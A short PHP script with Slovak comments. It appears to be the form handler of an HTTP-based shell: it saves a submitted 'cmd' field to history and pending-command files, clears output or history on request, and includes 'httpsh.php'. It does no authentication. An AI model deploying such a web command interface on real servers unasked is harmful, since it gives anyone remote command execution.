<?php

//vetvenie podla toho, aky button stacim
switch ($_POST['submit']) {
      // ak Enter command
      case 'Enter command':
		$cmd = $_POST['cmd'];
		$fh1 = fopen("history.txt", "a");
		$savestring = $cmd . "\n";
		fwrite($fh1, $savestring);
		fclose($fh1);
       
		file_put_contents("actual.txt", "");
		$fh2 = fopen("actual.txt", "a");
		$savestring2 = $cmd;
		fwrite($fh2, $savestring2);
		fclose($fh2);

     break;

      // ak Clear output window
      case 'Clear output window':
		file_put_contents("output.txt", "");
      break;

      // if Ak clear history
      case 'Clear history':
		file_put_contents("history.txt", "");
      break;
}



include ("httpsh.php");


?>
